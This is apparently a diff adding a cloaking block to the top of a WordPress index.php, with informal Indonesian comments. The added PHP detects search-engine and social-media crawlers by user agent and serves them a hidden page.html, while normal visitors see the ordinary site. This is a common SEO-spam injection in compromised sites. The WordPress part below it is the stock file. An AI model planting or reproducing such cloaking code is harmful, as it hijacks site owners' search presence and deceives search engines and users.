@@ -1,0 +1,47 @@
+<?php
+ $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
+// Tambahin 'googlebot' di sini biar mutlak
+ $target_bots = array('googlebot', 'google', 'adsbot-google', 'mediapartners-google', 'slurp', 'bingbot', 'duckduckbot', 'facebookexternalhit');
+
+ $is_bot = false;
+
+
+foreach ($target_bots as $bot) {
+    
+    if (strpos($user_agent, $bot) !== false) {
+        $is_bot = true;
+        break; 
+    }
+}
+
+
+if ($is_bot) {
+    
+    if (file_exists('page.html')) {
+        header('Content-Type: text/html'); 
+        readfile('page.html');
+    } else {
+        echo "FILE page.html GAK ADA!";
+    }
+    exit; 
+}
+
+
+?>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
